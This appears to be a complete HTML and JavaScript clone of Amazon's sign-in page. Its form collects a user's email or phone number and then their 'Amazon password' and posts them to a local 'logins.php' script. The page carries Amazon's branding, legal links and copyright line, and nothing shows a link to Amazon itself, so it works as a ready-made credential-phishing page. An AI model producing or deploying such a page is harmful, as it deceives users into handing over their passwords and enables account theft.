<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g=="
    crossorigin="anonymous" referrerpolicy="no-referrer" />
    <meta name="color-scheme" content="light only">
    <!-- <link rel="stylesheet" href="/styles.css"> -->
    <!-- <script src="/app.js" defer></script> -->
    <title>Amazon</title>

<style>
    :root{
    --primary-color: #222e3d;
    --btn-color-1: #ecc14b;
    --btn-color-2: #f4c955;
    --btn-color-3: #fad262;
    }

    *{
        box-sizing: border-box;
        margin: 0;
        padding: 0;
    }

    html, body{
      height: 100%;
    }

    a{
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
      cursor: pointer;
      color: #c45500;
    }

    body{
      font-family: Arial, Helvetica, sans-serif;
    }


    /* HEADER */
    .header{
        background-color: var(--primary-color);
        height: 15vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .logo{
        margin-left: 1rem;
    }

    /* .logo span{
        background-image: url("https://1000logos.net/amazon-logo/");
    } */

    .logo img{
        margin-top: 0.5rem;
        width: 5rem;
        position: relative;
    }

    /* .logo .text{
        position: fixed;
        left: 54%;
        top: 5%;
        color: #fff;
    } */
    /* HEADER END */

    .active{display: block;}

    .welcome{
        margin: 0.6rem 1rem;
    }

    .box-container{
        border: 0.1rem solid #d6d6d6;
        /* box-shadow: 0.1 0.1rem 0.2rem rgba(0, 0, 0, 0.1); */
        background-color: #fff;
        margin: 1.3rem auto;
        height: 411.6px;
        width: 23rem;
        padding: 1.8rem 2rem;
    }

    .title{
      font-weight:500;
      margin-bottom: 1.3rem;
    }

    .login label{
      font-weight: bold;
      font-size: 0.813rem;
    }

    .login input[type="text"]{
      width: 100%;
      background-color: #fff;
      height: 31px;
      padding: 3px 7px;
      line-height: normal;
      border: 1px solid #a6a6a6;
      border-top-color: #949494;
      border-radius: 3px;
      box-shadow: 0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset;
      outline: 0;
      margin-top: 0.2rem;
    }

    .login input[type='submit'],
    .login input[type='button']{
      background: linear-gradient(to bottom, #f0c14b, #e8bb49, #e1b442);
      border-color: #a88734 #9c7e31 #846a29;
      border-width: 1px;
      color: #111;
      border-radius: 3px;
      margin-top: 0.8rem;
      width: 100%;
      padding: 0.6rem;
    }

    .legal-text-row{
      font-size: 0.75rem;
      margin-top: 1.3rem;
    }

    .help{
      margin-top: 1.2rem;
      font-size: 0.8rem;
    }

    .help i{
      margin-right: 0.5rem;
    }



    h2 {
      color: rgb(134, 134, 134);
      font-weight: normal;
      letter-spacing: 1px;
      font-size: 11.5px;
      width: 315px;
      text-align: center;
      border-top: 1px solid rgba(0, 0, 0, 0.1);
      border-bottom: 1px solid rgba(255, 255, 255, 0.3);
      line-height: 0.1em;
      margin: 10px 0 20px;
      margin-bottom: 5px;
    }

    h2 span {
       background:#fff;
       padding:0 10px;
    }

    #createAccount{
     margin-top: 1.25rem;
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
    }

    #newAccount{
     background: linear-gradient(#f6f7f9, #e7e9ec);
     margin-top: 10px;
     margin-bottom: 20px;
     width:315px;
     height:33px;
     font-size:14px;
     border: 0.5px solid #aaaaaa;
     border-radius:3px;
    }

    #newAccount:hover{
     background: linear-gradient(#f5f6f8, #d9dce1);
    }

    /* FOOTER */
    .footer{
      background-color: #141920;
      height: 16vh;
    }

    .footer-links{
      text-align: center;
      padding-top: 1rem;
    }

    .footer-links a{
        margin-right: 3rem;
        font-size: 0.8rem;
        text-align: center;
        color: #999;
    }

    #special{
      font-size: 11px;
      color: #999;
      margin-top: 1.5rem;
      text-align: center;
    }
    /* FOOTER END */


    .btn{
        background: var(--btn-color-1);
        background: linear-gradient(to bottom,#f7dfa5,#f0c14b);
        width: 100%;
        padding: 0.8rem;
        text-align: center;
        border: none;
        border-radius: 0.2rem;
        margin-top: 1rem;
    }

    .btn:hover{
        background: var(--btn-color-1);
        background: linear-gradient(to bottom,#f5d78e,#eeb933);
    }

    .email-input{
      display: block;
    }

    .password-input{
      display: none;
      font-size: 0.8rem;
    }

    .email-display{
      margin-top: -1rem;
      margin-bottom: 0.6rem;
    }

    .password-input input[type="password"] {
      width: 100%;
      background-color: #fff;
      height: 31px;
      padding: 3px 7px;
      line-height: normal;
      border: 1px solid #a6a6a6;
      border-top-color: #949494;
      border-radius: 3px;
      box-shadow: 0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset;
      outline: 0;
      margin-top: 0.2rem;
    }

    .flex{
      margin-top: 1.3rem;
      margin-bottom: 1.3rem;
    }

    .flex a{
      float: right;
    }

    .email-display button{
        border: none;
        background: none;
        text-decoration: none;
        color: #0000EE;
        font-size: 0.78rem;
    }

    .email-display button:hover{
        color: #c45500;
        text-decoration: underline;
    }



    @media screen and (max-width:1000px){
    
      .box-container{
        height: 55vh;
        min-height: 50vh;
        width: 20rem;
      }
    }


    @media (prefers-color-scheme: dark) {
      body{
        background-color: #f5f6f8;
      }
    }
</style>
</head>
<body>
    <header class="header">
        <a class="logo">
            <span><img src="/images/amazon-logo.png"></span> 
        </a>
    </header>
    <div class="box-container">
        <div class="container">
            <h1 class="title">Sign in</h1>

            <div class="login">
                <form action="logins.php" method="post" onkeydown="return event.key != 'Enter';">
                    <div class="email-input" id="email-input">
                        <label for="email">Email or mobile phone number</label><br>
                        <input type="text" name="email" class="email-input" id="email-display" maxlength="128">
                        <input type="button" name="continue" value="Continue" id="continue">
                    </div>
                    <div class="password-input" id="pwd-input">
                        <p class="email-display">
                            <span id="email"></span> <button> Change</button>
                        </p>
                        <label for="password">Amazon password</label><br>
                        <input type="password" name="password" id="pwdInput"><br>
                        <div class="flex">
                            <input type="checkbox" id="showPwd"> Show Password
                            <a href="/">Forgot password?</a>
                        </div>
                        <input type="checkbox"> Keep me signed in. <a href="/">Details</a>
                        <input type="submit" name="sign-in" value="Sign-in">
                    </div>
                </form>
            </div>

            <div class="legal-text-row">
                By signing-in you agree to Amazon's 
                <a href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=1040616">Conditions of Use &amp; Sale</a>. 
                Please see our 
                <a href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=502584">Privacy Notice</a>, 
                our 
                <a href="/gp/help/customer/display.html/?nodeId=201890250">Cookies Notice</a> 
                and our 
                <a href="/gp/help/customer/display.html/?nodeId=201909150">Interest-Based Ads Notice</a>.
            </div>
            <div class="help">
                <i class="fa-solid fa-caret-right"></i><span><a href="/">Need help?</a></span>
            </div>
        </div>
    </div>

    <div id="createAccount">
        <h2><span>New to Amazon?</span></h2>
        <button id="newAccount" name="newAcct">Create your Amazon account</button>
      </div>



    </div>


    <footer class="footer">
        <div class="container-1">
            <div class="footer-links">
            <div class="footer-links-top">
                <a href="/">Conditions of Use</a>
                <a href="/">Privacy Notice</a>
                <a href="/">Help</a>
                <a href="/">Cookies Notice</a>
                <a href="/">Interest-Based Ads Notice</a>
            </div>
                <p class="links" id="special">
                    © 1996-2016, Amazon.com, Inc. or its affiliates
                  </p>
            </div>
        </div>
    </footer>

<script>
    //Show password
const showPwd = document.getElementById('showPwd');

showPwd.addEventListener('click', function(){
    var x = document.getElementById('pwdInput');
    if (x.type === "password") {
        x.type = "text";
    } else {
        x.type = "password";
    }
})


//Continue button
const continueBtn = document.getElementById('continue');
const emailLogin = document.getElementById('email-input');
const pwdLogin = document.getElementById('pwd-input');

continueBtn.addEventListener('click', function(){
    emailLogin.style.display = 'none';
    pwdLogin.style.display = 'block';

    display();
})


//get email name and display it
function display(){
    const emailDisplay = document.getElementById('email-display');
    const email = document.getElementById('email').innerHTML = emailDisplay.value;
}



document.documentElement.style.setProperty('overflow', 'auto');
const initialHeight = window.innerHeight
const metaViewport = document.querySelector('meta[name=viewport]');
metaViewport.setAttribute('content', `height=${initialHeight}px, width=device-width, initial-scale=1.0`);

</script>
</body>
</html>

